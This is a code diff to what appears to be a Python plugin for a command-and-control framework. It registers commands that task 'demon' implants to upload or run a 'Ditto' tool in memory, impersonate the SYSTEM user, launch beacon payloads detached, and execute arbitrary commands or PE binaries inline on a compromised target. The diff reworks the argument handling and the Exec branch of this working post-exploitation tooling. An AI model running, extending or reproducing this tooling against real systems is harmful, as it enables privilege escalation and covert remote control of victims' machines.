@@ -30,7 +30,7 @@ def parse_args(params):
     parser_system.add_argument('beacon_path')
 
     parser_passsthru = subparsers.add_parser('Exec', help='Command to execute on target')
-    parser_passsthru.add_argument('commandline', nargs='+')
+    parser_passsthru.add_argument('commandline', nargs='*')
 
     ## parser_DLL = subparsers.add_parser('Inject', help='Dll inject in other process') // Incoming
 
@@ -274,7 +274,7 @@ def impersonnatelaunchinmemory( demonID, *param ):
             beaconpath = args.beacon_path
             demon.Command(TaskID, f"Ditto-noconsolation {EXECUTABLEFILE} --continue-on-error --target-username syst exec --command {beaconpath} --detached")
             ##demon.Command(TaskID, f"{noconsolation} {EXECUTABLEFILE} --continue-on-error --target-username syst exec --command cmd.exe --detached")
-    else:
+    elif args.command == 'Exec':
         arg = " ".join(args.commandline)
         demon.Command(TaskID, f"Ditto-noconsolation {EXECUTABLEFILE} {arg}")
     return TaskID
@@ -306,12 +306,14 @@ def impersonnate( demonID, *param ):
         else:
             beaconpath = args.beacon_path
             demon.Command(TaskID, f"shell {dest_Ditto} --continue-on-error --target-username syst exec --command {beaconpath} --detached")
-    else:
+    elif args.command == 'Exec':
         arg = " ".join(args.commandline)
-        demon.Command(TaskID, f"noconsolation {dest_Ditto} {arg}")
+        demon.Command(TaskID, f"shell {dest_Ditto} {arg}")
+    else:
+        pass
     
     return TaskID
 
 RegisterCommand(impersonnate, "", "Ditto-upload", "Uploads and run Ditto tool on the target", 0, "", "" )
 RegisterCommand(impersonnatelaunchinmemory, "", "Ditto-Memory", "run Ditto tool in memory of the target with no upload", 0, "", "" )
-RegisterCommand( noconsolation, "", "Ditto-noconsolation", "Execute a PE inline", 0, "[--local] [--timeout 60] [-k] [--method funcname] [-w] [--no-output] [--alloc-console] [--close-handles] [--free-libraries] [--dont-save] [--list-pes] [--unload-pe pename] /path/to/binary.exe arg1 arg2", "--local C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe $ExecutionContext.SessionState.LanguageMode" )
+RegisterCommand(noconsolation, "", "Ditto-noconsolation", "(Dont use) Just réimplementation of noconsolation module (Because the module use relative path and i c'ant use this in my python script)", 0, "[--local] [--timeout 60] [-k] [--method funcname] [-w] [--no-output] [--alloc-console] [--close-handles] [--free-libraries] [--dont-save] [--list-pes] [--unload-pe pename] /path/to/binary.exe arg1 arg2", "--local C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe $ExecutionContext.SessionState.LanguageMode" )
